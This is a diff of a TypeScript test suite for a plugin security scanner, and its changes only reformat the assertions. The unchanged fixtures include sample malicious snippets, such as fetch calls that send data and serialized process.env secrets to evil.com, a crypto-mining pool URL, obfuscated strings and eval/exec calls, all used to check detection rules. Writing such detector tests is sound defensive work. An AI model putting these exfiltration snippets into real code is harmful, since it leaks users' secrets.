@@ -41,9 +41,11 @@ const cmd = \`ls \${dir}\`;
 exec(cmd);
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings.some((f) => f.ruleId === "dangerous-exec" && f.severity === "critical")).toBe(
-      true,
-    );
+    expect(
+      findings.some(
+        (f) => f.ruleId === "dangerous-exec" && f.severity === "critical",
+      ),
+    ).toBe(true);
   });
 
   it("detects child_process spawn usage", () => {
@@ -52,9 +54,11 @@ const cp = require("child_process");
 cp.spawn("node", ["server.js"]);
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings.some((f) => f.ruleId === "dangerous-exec" && f.severity === "critical")).toBe(
-      true,
-    );
+    expect(
+      findings.some(
+        (f) => f.ruleId === "dangerous-exec" && f.severity === "critical",
+      ),
+    ).toBe(true);
   });
 
   it("does not flag child_process import without exec/spawn call", () => {
@@ -74,7 +78,10 @@ const result = eval(code);
 `;
     const findings = scanSource(source, "plugin.ts");
     expect(
-      findings.some((f) => f.ruleId === "dynamic-code-execution" && f.severity === "critical"),
+      findings.some(
+        (f) =>
+          f.ruleId === "dynamic-code-execution" && f.severity === "critical",
+      ),
     ).toBe(true);
   });
 
@@ -84,7 +91,10 @@ const fn = new Function("a", "b", "return a + b");
 `;
     const findings = scanSource(source, "plugin.ts");
     expect(
-      findings.some((f) => f.ruleId === "dynamic-code-execution" && f.severity === "critical"),
+      findings.some(
+        (f) =>
+          f.ruleId === "dynamic-code-execution" && f.severity === "critical",
+      ),
     ).toBe(true);
   });
 
@@ -96,7 +106,9 @@ fetch("https://evil.com/collect", { method: "post", body: data });
 `;
     const findings = scanSource(source, "plugin.ts");
     expect(
-      findings.some((f) => f.ruleId === "potential-exfiltration" && f.severity === "warn"),
+      findings.some(
+        (f) => f.ruleId === "potential-exfiltration" && f.severity === "warn",
+      ),
     ).toBe(true);
   });
 
@@ -105,9 +117,11 @@ fetch("https://evil.com/collect", { method: "post", body: data });
 const payload = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65";
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings.some((f) => f.ruleId === "obfuscated-code" && f.severity === "warn")).toBe(
-      true,
-    );
+    expect(
+      findings.some(
+        (f) => f.ruleId === "obfuscated-code" && f.severity === "warn",
+      ),
+    ).toBe(true);
   });
 
   it("detects base64 decode of large payloads (obfuscation)", () => {
@@ -117,7 +131,9 @@ const data = atob("${b64}");
 `;
     const findings = scanSource(source, "plugin.ts");
     expect(
-      findings.some((f) => f.ruleId === "obfuscated-code" && f.message.includes("base64")),
+      findings.some(
+        (f) => f.ruleId === "obfuscated-code" && f.message.includes("base64"),
+      ),
     ).toBe(true);
   });
 
@@ -126,9 +142,11 @@ const data = atob("${b64}");
 const pool = "stratum+tcp://pool.example.com:3333";
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings.some((f) => f.ruleId === "crypto-mining" && f.severity === "critical")).toBe(
-      true,
-    );
+    expect(
+      findings.some(
+        (f) => f.ruleId === "crypto-mining" && f.severity === "critical",
+      ),
+    ).toBe(true);
   });
 
   it("detects WebSocket to non-standard high port", () => {
@@ -136,9 +154,11 @@ const pool = "stratum+tcp://pool.example.com:3333";
 const ws = new WebSocket("ws://remote.host:9999");
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings.some((f) => f.ruleId === "suspicious-network" && f.severity === "warn")).toBe(
-      true,
-    );
+    expect(
+      findings.some(
+        (f) => f.ruleId === "suspicious-network" && f.severity === "warn",
+      ),
+    ).toBe(true);
   });
 
   it("detects process.env access combined with network send (env harvesting)", () => {
@@ -147,9 +167,11 @@ const secrets = JSON.stringify(process.env);
 fetch("https://evil.com/harvest", { method: "POST", body: secrets });
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings.some((f) => f.ruleId === "env-harvesting" && f.severity === "critical")).toBe(
-      true,
-    );
+    expect(
+      findings.some(
+        (f) => f.ruleId === "env-harvesting" && f.severity === "critical",
+      ),
+    ).toBe(true);
   });
 
   it("returns empty array for clean plugin code", () => {
@@ -210,7 +232,9 @@ describe("scanDirectory", () => {
 
     const findings = await scanDirectory(root);
     expect(findings.length).toBeGreaterThanOrEqual(1);
-    expect(findings.some((f) => f.ruleId === "dynamic-code-execution")).toBe(true);
+    expect(findings.some((f) => f.ruleId === "dynamic-code-execution")).toBe(
+      true,
+    );
   });
 
   it("skips node_modules directories", async () => {
@@ -222,7 +246,9 @@ describe("scanDirectory", () => {
     fsSync.writeFileSync(path.join(root, "clean.js"), `export const x = 1;`);
 
     const findings = await scanDirectory(root);
-    expect(findings.some((f) => f.ruleId === "dynamic-code-execution")).toBe(false);
+    expect(findings.some((f) => f.ruleId === "dynamic-code-execution")).toBe(
+      false,
+    );
   });
 
   it("skips hidden directories", async () => {
@@ -230,11 +256,16 @@ describe("scanDirectory", () => {
     const hidden = path.join(root, ".hidden");
     fsSync.mkdirSync(hidden, { recursive: true });
 
-    fsSync.writeFileSync(path.join(hidden, "secret.js"), `const x = eval("hack");`);
+    fsSync.writeFileSync(
+      path.join(hidden, "secret.js"),
+      `const x = eval("hack");`,
+    );
     fsSync.writeFileSync(path.join(root, "clean.js"), `export const x = 1;`);
 
     const findings = await scanDirectory(root);
-    expect(findings.some((f) => f.ruleId === "dynamic-code-execution")).toBe(false);
+    expect(findings.some((f) => f.ruleId === "dynamic-code-execution")).toBe(
+      false,
+    );
   });
 
   it("scans hidden entry files when explicitly included", async () => {
@@ -242,10 +273,17 @@ describe("scanDirectory", () => {
     const hidden = path.join(root, ".hidden");
     fsSync.mkdirSync(hidden, { recursive: true });
 
-    fsSync.writeFileSync(path.join(hidden, "entry.js"), `const x = eval("hack");`);
+    fsSync.writeFileSync(
+      path.join(hidden, "entry.js"),
+      `const x = eval("hack");`,
+    );
 
-    const findings = await scanDirectory(root, { includeFiles: [".hidden/entry.js"] });
-    expect(findings.some((f) => f.ruleId === "dynamic-code-execution")).toBe(true);
+    const findings = await scanDirectory(root, {
+      includeFiles: [".hidden/entry.js"],
+    });
+    expect(findings.some((f) => f.ruleId === "dynamic-code-execution")).toBe(
+      true,
+    );
   });
 });
 
@@ -262,7 +300,10 @@ describe("scanDirectoryWithSummary", () => {
     // File 1: critical finding (eval)
     fsSync.writeFileSync(path.join(root, "a.js"), `const x = eval("code");`);
     // File 2: critical finding (mining)
-    fsSync.writeFileSync(path.join(sub, "b.ts"), `const pool = "stratum+tcp://pool:3333";`);
+    fsSync.writeFileSync(
+      path.join(sub, "b.ts"),
+      `const pool = "stratum+tcp://pool:3333";`,
+    );
     // File 3: clean
     fsSync.writeFileSync(path.join(sub, "c.ts"), `export const clean = true;`);
 
@@ -288,7 +329,10 @@ describe("scanDirectoryWithSummary", () => {
   it("skips files above maxFileBytes", async () => {
     const root = makeTmpDir();
     const largePayload = "A".repeat(4096);
-    fsSync.writeFileSync(path.join(root, "large.js"), `eval("${largePayload}");`);
+    fsSync.writeFileSync(
+      path.join(root, "large.js"),
+      `eval("${largePayload}");`,
+    );
 
     const summary = await scanDirectoryWithSummary(root, { maxFileBytes: 64 });
     expect(summary.scannedFiles).toBe(0);
@@ -297,7 +341,10 @@ describe("scanDirectoryWithSummary", () => {
 
   it("ignores missing included files", async () => {
     const root = makeTmpDir();
-    fsSync.writeFileSync(path.join(root, "clean.js"), `export const ok = true;`);
+    fsSync.writeFileSync(
+      path.join(root, "clean.js"),
+      `export const ok = true;`,
+    );
 
     const summary = await scanDirectoryWithSummary(root, {
       includeFiles: ["missing.js"],
@@ -308,16 +355,24 @@ describe("scanDirectoryWithSummary", () => {
 
   it("prioritizes included entry files when maxFiles is reached", async () => {
     const root = makeTmpDir();
-    fsSync.writeFileSync(path.join(root, "regular.js"), `export const ok = true;`);
+    fsSync.writeFileSync(
+      path.join(root, "regular.js"),
+      `export const ok = true;`,
+    );
     fsSync.mkdirSync(path.join(root, ".hidden"), { recursive: true });
-    fsSync.writeFileSync(path.join(root, ".hidden", "entry.js"), `const x = eval("hack");`);
+    fsSync.writeFileSync(
+      path.join(root, ".hidden", "entry.js"),
+      `const x = eval("hack");`,
+    );
 
     const summary = await scanDirectoryWithSummary(root, {
       maxFiles: 1,
       includeFiles: [".hidden/entry.js"],
     });
     expect(summary.scannedFiles).toBe(1);
-    expect(summary.findings.some((f) => f.ruleId === "dynamic-code-execution")).toBe(true);
+    expect(
+      summary.findings.some((f) => f.ruleId === "dynamic-code-execution"),
+    ).toBe(true);
   });
 
   it("throws when reading a scannable file fails", async () => {
@@ -329,7 +384,9 @@ describe("scanDirectoryWithSummary", () => {
     const spy = vi.spyOn(fs, "readFile").mockImplementation(async (...args) => {
       const pathArg = args[0];
       if (typeof pathArg === "string" && pathArg === filePath) {
-        const err = new Error("EACCES: permission denied") as NodeJS.ErrnoException;
+        const err = new Error(
+          "EACCES: permission denied",
+        ) as NodeJS.ErrnoException;
         err.code = "EACCES";
         throw err;
       }
@@ -337,7 +394,9 @@ describe("scanDirectoryWithSummary", () => {
     });
 
     try {
-      await expect(scanDirectoryWithSummary(root)).rejects.toMatchObject({ code: "EACCES" });
+      await expect(scanDirectoryWithSummary(root)).rejects.toMatchObject({
+        code: "EACCES",
+      });
     } finally {
       spy.mockRestore();
     }
